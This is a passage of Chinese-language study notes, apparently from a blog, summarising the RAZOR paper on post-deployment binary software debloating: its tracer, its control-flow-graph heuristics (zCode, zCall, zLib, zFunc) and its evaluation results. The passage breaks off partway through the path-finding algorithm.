        <content type="html"><![CDATA[<p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_x.png" alt></p><h1 id="razor%3A-a-framework-for-post-deployment" tabindex="-1">Razor: A Framework for Post-deployment</h1><p>Software Debloating</p><p>28th USENIX Security Symposium　CCFA会</p><p>Qian C, Hu H, Alharthi M, et al. RAZOR: A framework for post-deployment software debloating[C],28th USENIX security symposium (USENIX Security 19). 2019: 1733-1750.</p><h2 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h2><ul><li>最近得debloating技术需要源码,限制了其实际中的应用</li><li>本文提出了一个实际的debloating框架:RAZOR,在部署的二进制代码上进行代码简化<ul><li>基于用户的期望,生成一个最小的满足功能的程序</li><li>同时不只是根据给定的测试用例,RAZOR使用了几种控制流的启发式算法来推断出必要的代码,以支持用户期望的功能</li></ul></li><li>我们再常见的基准上进行测试,同时也在真实的应用上进行测试,包括 火狐浏览器,闭源PDF阅读器FoxitReader,结果显式RAZOR可以在二进制上减少超过70%的代码</li><li>RAZOR简化了代码,并且没有引入新的安全隐患,因此RAZOR是一个实际的框架,可以在对实际的程序使用</li></ul><h2 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h2><ul><li><p>要使这种部署后使用的方法(即面向部署二进制文件的方法)对用户有用,有两个挑战</p><ul><li><ol><li>如何使得对软件了解较少的用户,表达他们对软件特点的需求,即哪个功能需要保留和移除</li></ol></li><li><ol start="2"><li>如何修改软件二进制文件来移除不需要的功能和保留需要的</li></ol></li></ul></li><li><p>为了解决第一个挑战,可以让用户提供一组样例输入集合来解释他们将如何使用这个软件,这样其实输入到输出构成一个映射即可,然而实际中,即使处理相同的输入,也会有不同的执行路径,因此这种方法不可行</p></li><li><p>为了基于用户提供的输入能够实际地简化程序,我们必须找到支持完整功能但处理样例输入时为执行的代码,称为<strong>相关代码</strong></p><ul><li>然而,相关代码地识别很困难,特别地,让用户(甚至开发者)提供一个能够执行某一功能的所有必要代码的输入语料库是一项具有挑战的任务</li><li>此外,即使用户提供了所有可能输入的一些描述(例如样式),仍然很难确定这些输入所有可达的代码</li><li>因此,我们坚信,所有在部署后情况下的去膨胀机制,都应该基于 尽力而为 的启发式机制.<ul><li>启发式方法会尽可能地标识相关代码,同时保留最少的不相关代码</li><li>而死代码消除,增量调试法不适用于本问题,因为它们只关注移除静态死代码 或 保留程序在几个特定输入上的行为</li></ul></li></ul></li><li><p>我们设计了一种启发式方法,基于这样的假设:代码路径差异越大,相关功能越少. 具体地,对于给定的与运行路径 $ p $ ,我们要找到一条不同的路径 $ q $ ,满足</p><ul><li><ol><li>$ q $ 没有不同的指令</li></ol></li><li><ol start="2"><li>$ q $ 没有调用新的函数</li></ol></li><li><ol start="3"><li>$ q $ 不需要额外地库函数</li></ol></li><li><ol start="4"><li>$ q $ 不依赖于具有不同功能地库函数</li></ol></li></ul></li><li><p>然后,我们相信 $ q $ 是与 $ p $ 相关的,将 $ q $ 中的代码视为相关代码</p></li><li><p>从(1)到(4),启发式方法在包括地代码越来愈多,对于给定程序,我们会逐渐提升启发式等级直到生成的程序稳定.然而实际上,在我们的评估中,即使是最激进的启发式方法,也只会使得引入的最终代码少量增加</p></li><li><p>当所有相关代码被确定,我们开发了一个二进制重写平台来删除不必要的代码生成一个简化的程序.</p><ul><li>由于简化程序的特性,我们的平台不会面临一般二进制重写工具的符号化问题[51,52,53,5] <code>TODO</code><ul><li>具体来说,通用二进制重写工具必须保留所有程序功能,但在没有可靠反汇编技术和完成的控制流图(control-flow graph,CFG)下很困难</li><li>对于去膨胀,我们只保留样本输入的功能,其中反汇编和CFG可以通过观察程序运行获得</li></ul></li></ul></li><li><p>我们设计了RAZOR框架来实现部署后的去膨胀,框架由三个部分组成</p><ul><li><strong>Tracer</strong>:监视程序在样例输入上的执行,记录执行代码</li><li><strong>PathFinder</strong>:使用启发式方法从已经执行的代码中推断出更多的相关代码</li><li><strong>Generator</strong>:基于Tracer和PathFinder的输出产生新的二进制文件</li></ul></li><li><p>在RAZOR框架中,我们实现了三个追踪器(两个基于动态二进制插装,一个基于硬件追踪功能),四个启发式路径查找算法,一个二进制生成器</p></li><li><p>为了理解RAZOR的效果,我们再三个基准集进行了测试(1)SPEC CPU2006 基准 (2)ChiselBenchmark 10个程序 (3) 两个真实程序,火狐浏览器和闭源PDF阅读器FoxitReader</p></li><li><p>在我们的评估中,我们基于一组训练输入执行跟踪和去膨胀,并用一组和输入相似但不同的输入进行测试,结果显示</p><ul><li>RAZOR可以减少70-80%的程序大小,同时只引入了1.7%的新二进制文件开销</li><li>我们将RAZOR和CHISEL进行比较,在ChiselBenchmark上,我们发现Chisel简化程度更好,但在测试用例中失败了几个,同时Chisel引入了新的漏洞在简化程序中,例如 由于删除边界检查而导致的缓冲区溢出.而RAZOR不会引入新的问题</li><li>我们还分析了我们的路径查找器识别出的相关代码,并发现不同的启发式方法可以很好的提升程序的鲁棒性</li></ul></li><li><p>综上所述,我们的论文创新如下</p><ul><li><strong>新方法</strong>:RAZOR,在二进制文件上进行使用,需要给定输入</li><li><strong>开源</strong>:<a href="https://github.com/cxreet/razor.">Razor仓库地址</a></li><li><strong>贴合实际,即开即用</strong>:在现实程序中进行了测试,结果显示简化后的程序有显著的减少,更好的安全性</li></ul></li></ul><h2 id="2-%E9%97%AE%E9%A2%98" tabindex="-1">2 问题</h2><h3 id="2.1-motivating-example" tabindex="-1">2.1 Motivating Example</h3><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_1.png" alt></p><ul><li>上图展示了一个膨胀的程序,用于解析不同种类的图片<ul><li>基于用户的选择调用不同的函数</li><li>在<code>parsePNG</code>中<ul><li>代码首先分配内存来保存图像</li><li>然后将内存地址保存在<code>img</code>中</li><li>然后通过使用宏<code>ALIGN(v,a)</code>,确保<code>img</code>按照16字节对齐.</li><li>最后调用函数<code>readToMem</code>将图像内容从文件加载到内存中进一步处理</li></ul></li><li><code>parseJPEG</code>和<code>parseGIF</code>代码类似</li></ul></li><li>然而当用户只需要解析PNG格式的图片,该程序是膨胀的,例如 iPhone设备总是PNG格式的图片,因此不需要解析JPEG的代码,这些代码中可能还存在一些安全问题.</li><li>在现实中,我们可以轻易找到支持过时格式(如PCX,Sun Raster,TGA)的文档阅读器(如MacOS 上的 Preview),我们可以对这些程序进行去膨胀来减小他们的大小和攻击面</li></ul><h3 id="2.2-program-debloating" tabindex="-1">2.2 Program Debloating</h3><ul><li><p>问题定义:给定一个程序 $ P $ , 其有一组功能 $ \mathcal{F} = {F_0,F_1,F_2,…} $ ,用户指定的功能 $ \mathcal{F_u} = {F_i,F_j,F_k,…} $ , 我们的目标是生成一个程序 $ P’ $ 保留在 $ \mathcal{F_u} $ 中的函数,并且拒接对 $ \mathcal{F}-\mathcal{F_u} $中函数的请求</p></li><li><p>本文关注于在软件二进制代码中简化功能:我们从运行中构建一个控制流图CFG来指导基于二进制的简化.</p></li><li><p>下图展示了之前例子在二进制下的状态<img src="../../../images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_2.png" alt></p><ul><li><ol><li>黑色箭头表示过程内跳转</li></ol></li><li><ol start="2"><li>虚线箭头表示过程间跳转</li></ol></li></ul></li><li><p>在CFG中去除不可达的节点,我们可以得到简化后的CFG</p></li></ul><h3 id="2.3-%E6%8C%91%E6%88%98%E5%92%8C%E6%8E%AA%E6%96%BD" tabindex="-1">2.3 挑战和措施</h3><ul><li>功能-&gt;函数-&gt;二进制代码的转换是有挑战的,为此引出两个问题<ul><li><strong>C1</strong>: 如何表达不必要的功能</li><li><strong>C2</strong>: 如何将功能对应到代码</li></ul></li><li>以上问题的可能解决方法是根据用户提供的一组测试用例来观测程序的运行以此识别出相关代码.<ul><li>我们的问题可以描述为:给定二进制程序 $ P_b $ 和一组测试集 $ T={t_i,t_j,t_k…} $ ,每个测试用例 $ t_i $ 触发 $ P_b $ 的一些函数,我们会创建一个最小的程序 $ P_b’ $ 仅支持 $ T $ 中的测试用例触发的函数</li></ul></li><li>测试用例可以帮我们解决<strong>C1,C2</strong>,但测试用例不能完全覆盖所需功能的全部相关代码,即有一些相关代码不会被触发.如果我们仅删除未运行的代码,程序功能将会被破坏<ul><li>例如:在上面解析图片的代码中,第11行的判断可能在测试用例中一直未实现,导致第12行被认为是未执行代码,这将引发问题.</li><li>在本文后续 $5.2 的评估中,展示了如果只是简单的移除未运行的代码,会导致很多问题,甚至程序的崩溃.<strong>并且所有基于测试用例的方法都会有这个问题</strong></li></ul></li><li><strong>C3</strong>: 如何从有限的测试用例中找到相关代码<ul><li>针对此问题,我们提出了基于CFG的启发式方法来推理出更多的相关代码,来支持我们需要的功能</li><li>问题定义:<ul><li>假设 $ T $ 中的测试用例触发了 $  \mathcal{I} = {i_0,i_1,i_2,…}　$ 中的二进制指令,我们的启发式方法会自动地指明更多被测试用例集合 $ T $ 所覆盖功能的相关代码.</li><li>具体地,我们定义一个超集 $ \mathcal{I’} = \mathcal{I} \cup {i_x,i_y,i_z …}$ 并保留在 $ \mathcal{I’} $ 中的所有指令,同时删除其它指令使得代码最小化.</li></ul></li><li>在上面解析照片的例子中,如果测试用例中没有经过12行,我们的启发式搜索将会包括这一相关代码</li><li>在 $5.3 中 我们将会展示我们的启发式方法在查找相关代码上是有效的,并且只会引发少量的代码增加</li></ul></li></ul><h2 id="3-%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1" tabindex="-1">3 系统设计</h2><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_3.png" alt></p><ul><li>上图展示了RAZOR的架构:给定一个膨胀的二进制程序和一组可以触发所需程序功能的测试集,RAZOR移除不需要的代码生成 支持所需功能的最小二进制代码</li><li>为了实现上述目标<ul><li>RAZOR首先使用<code>Tracer</code>收集测试用例上的运行路径</li><li>随后编码路径构造程序的CFG,其中包含所有的运行指令</li><li>接着,RAZOR使用<code>PathFinder</code>来识别出相关代码,即使用启发式方法扩展CFG</li><li>最后基于扩展的CFG<code>Generator</code>重新生成二进制代码来生成满足功能的最小二进制程序</li></ul></li></ul><h3 id="3.1-%E8%BF%90%E8%A1%8C%E8%B7%AF%E5%BE%84%E6%94%B6%E9%9B%86" tabindex="-1">3.1 运行路径收集</h3><p><code>Tracer</code>收集三种信息记录控制流信息</p><ol><li>已执行指令,包括内存地址和原始字节</li><li>条件分支的跳转或不跳转,如 je指令</li><li>间接跳转或调用 的目标地址,如 jmpq *%rax</li></ol><ul><li><p>Tracer记录已执行指令的原始字节以处理动态生成/修改的代码,然而，指令级别的记录效率低下，同时大多数实际程序只包含静态代码</p></li><li><p>因此Tracer从基本块级别的记录开始，仅记录每个已执行基本块的地址;</p><ul><li>在执行过程中，它检测所有动态代码行为，如可写和可执行的内存区域（例如即时编译[13]），或重叠的基本块（例如合法的代码重用[26]），并切换到指令级别的记录以避免遗漏指令。</li><li>一个条件分支可能会被多次执行，最终覆盖一个或两个目标（即fall-through目标和跳转目标）。对于间接跳转/调用指令，我们记录所有已执行的目标并计算它们的频率</li></ul></li><li><p>下图为一个收集的运行路径的例子![]</p><ul><li>记录了分支跳转的情况</li><li>间接跳转的次数<br>(/images/论文/software%20debloating%20论文/(4)_4.png)</li></ul></li><li><p>我们发现使用多种工具收集执行跟踪是值得的</p><ul><li>首先，没有一种机制可以完全高效地记录跟踪信息<ul><li>基于软件的插桩工具:可以忠实地记录所有信息，但引入了显著的开销[7, 25, 6]</li><li>基于硬件的日志:可以有效的记录信息,但需要特殊的硬件,并且不能保证完备性(例如,Intel PT中的数据丢失)</li></ul></li><li>其次,程序在不同跟踪环境下执行的程序将显示不同的路径<ul><li><code>Dynamorio</code>总是将文件名扩展为绝对路径,导致一些程序中不同的执行路径(如 vim)</li></ul></li></ul></li><li><p>因此,我们提供了三种不同的软件和硬件实现,用户可以根据自己的需求选择最好的,甚至可以将多个工具的跟踪信息合并来获得更好的代码覆盖率</p></li><li><p><strong>CFG的构造</strong></p><ul><li>RAZOR使用收集到的执行路径来反汇编二进制文件,并以此可靠地构造CFG. 与先前使用启发式方法确定函数边界的工作[52, 51, 3, 4, 45]不同，RAZOR从执行跟踪中获取准确的指令地址和函数边界信息</li><li>从这种可靠地信息开始,我们可以识别更多地代码指令,随后我们的启发式方法可以将他们是否是相关代码进行考量<ul><li>对于条件分支指令,两个目标都是已知的,都可以有效地进行反汇编</li><li>对于间接跳转/调用指令,我们可以识别出潜在地跳转表</li></ul></li></ul></li></ul><h3 id="3.2-%E5%9F%BA%E4%BA%8E%E5%90%AF%E5%8F%91%E5%BC%8F%E7%9A%84%E8%B7%AF%E5%BE%84%E6%8E%A8%E6%96%AD-heuristic-based-path-inference" tabindex="-1">3.2 基于启发式的路径推断 Heuristic-based Path Inference</h3><p>我们使用最佳尝试的启发式方法以包括更多的相关代码.以下我们将按照保留代码的程度依次介绍</p><ul><li>下图为使用不同启发式方法产生的不同效果<ul><li>左侧为原始CFG,右侧为扩展后的CFG</li><li>代码设计为计算 <code>log(sqrt(max(rax,rbx,rcx)))</code></li><li>虚线表示追踪过程中未执行的分支和块,原始的执行路径是 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>1</mn></msub><mo>→</mo><msub><mi>L</mi><mn>2</mn></msub><mo>→</mo><msub><mi>L</mi><mn>3</mn></msub><mo>→</mo><msub><mi>L</mi><mn>5</mn></msub><mo>→</mo><msub><mi>L</mi><mn>7</mn></msub><mo>→</mo><msub><mi>L</mi><mn>9</mn></msub></mrow><annotation encoding="application/x-tex">L_1 \rightarrow L_2 \rightarrow L_3 \rightarrow L_5 \rightarrow L_7 \rightarrow L_9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq><br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_5.png" alt></li></ul></li></ul><h4 id="(1)-%E9%9B%B6%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8F%91%E5%BC%8F-zero-code-heuristic-(zcode)" tabindex="-1">(1) 零代码启发式 Zero-code heuristic (zCode)</h4><ul><li>该启发式方法引入新边(例如基本块之间的跳转)在CFG中</li><li>对于只有一个目标的条件跳转指令,<code>PathFinder</code>会检查非选择目标是否已经在CFG中,如果在,<code>PathFinder</code>也允许从该分支指令跳到非选择目标.<ul><li>这里需要注意到,这是将未运行的代码向与运行的代码中调价,即相关代码,所以总的程序仍然是简化的</li></ul></li><li>在上图中,<code>zCode</code>启发式方法将会引入边 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mn>1</mn><mo>→</mo><mi>L</mi><mn>3</mn></mrow><annotation encoding="application/x-tex">L1\rightarrow L3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">3</span></span></span></span></eq> ,因为 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mn>3</mn></mrow><annotation encoding="application/x-tex">L3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">3</span></span></span></span></eq> 是 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">L1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">1</span></span></span></span></eq> 的非选择目标,但之后依然存在在CFG中</li></ul><h4 id="(2)-%E9%9B%B6%E8%B0%83%E7%94%A8%E5%90%AF%E5%8F%91%E5%BC%8F-zero-call-heuristic-(zcall)" tabindex="-1">(2) 零调用启发式 Zero-call heuristic (zCall)</h4><ul><li>该启发式包括不执行任何函数调用的替代执行路径</li><li>使用该启发式方法,<code>PathFinder</code>从条件语句中未被采取的目标出发,并跟着控制流找到最终和 已执行路径合并的新路径. 如果新路径中没有<code>call</code>指令,则将其添加到CFG中</li><li>当<code>PathFinder</code>走到未运行指令时,我们没有准确的信息来反汇编或构建CFG,相反,我们依赖现有的方法[53,3]进行二进制分析</li><li>应用该启发式方法zcall,在上图中,<code>PathFinder</code>将会引入块 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">L_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和边 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mn>3</mn><mo>→</mo><mi>L</mi><mn>4</mn><mo>→</mo><mi>L</mi><mn>5</mn></mrow><annotation encoding="application/x-tex">L3\rightarrow L4 \rightarrow L5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">4</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">5</span></span></span></span></eq>,因为该路径在 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">L_5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 出进行了合并,且不包含调用指令</li></ul><h4 id="(3)-%E9%9B%B6%E5%BA%93%E8%B0%83%E7%94%A8%E5%90%AF%E5%8F%91%E5%BC%8F-zero-libcall-heuristic-(zlib)" tabindex="-1">(3) 零库调用启发式 Zero-libcall heuristic (zLib)</h4><ul><li>与zCall先死,但<code>PathFinder</code>在包括可选路径时更加激进<ul><li>新路径可以包含同二进制文件中的函数或已执行的外部函数的调用指令</li><li>但zlib不运行调用未执行的外部函数</li></ul></li><li>在上图中,使用该启发式,<code>PathFinder</code>将会引入块 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>6</mn></msub></mrow><annotation encoding="application/x-tex">L_6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和边 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>5</mn></msub><mo>→</mo><mi>L</mi><mn>6</mn><mo>→</mo><mi>L</mi><mn>7</mn></mrow><annotation encoding="application/x-tex">L_5\rightarrow L6 \rightarrow L7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">7</span></span></span></span></eq>,因为该路径没有对未执行的外部函数的调用</li></ul><h4 id="(4)-zero-functionality-heuristic-(zfunc)" tabindex="-1">(4) Zero-functionality heuristic (zFunc)</h4><ul><li>该启发式方法运行包括为执行的外部函数调用只要其不触发新的高级功能</li><li>为了将库函数和功能相关联,我们检查它们的描述并将其手工分组.<ul><li>例如,log和sqrt术语指数和算数字部份,因此认为其基于相似的功能</li></ul></li><li>使用该启发式方法,<code>PathFinder</code>将会引入块 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>8</mn></msub></mrow><annotation encoding="application/x-tex">L_8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 和边 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>7</mn></msub><mo>→</mo><mi>L</mi><mn>8</mn><mo>→</mo><mi>L</mi><mn>9</mn></mrow><annotation encoding="application/x-tex">L_7\rightarrow L8 \rightarrow L9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span><span class="mord">9</span></span></span></span></eq>,因为该路径没有对未执行的外部函数的调用,且不触发新的高级功能</li></ul><h4 id="(5)-%E7%AE%97%E6%B3%95" tabindex="-1">(5) 算法</h4><ul><li>下图展示了<code>PathFinder</code>寻找相关代码的步骤<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(4)_6.png" alt></li></ul><ol><li>对于CFG中的每一个条件语句</li><li>使用<code>get_non_taken_branch</code>得到未执行的分支</li><li>如果两个分支都执行了,继续遍历;否则按照启发式等级进行判断</li><li>如果为执行的分支属于当前CFG且当前启发式等级大于等于 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mi>C</mi><mi>o</mi><mi>d</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">zCode</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span></span></span></span></eq>,</li><li><eq><span class="katex"><span class="katex-mathml"><math 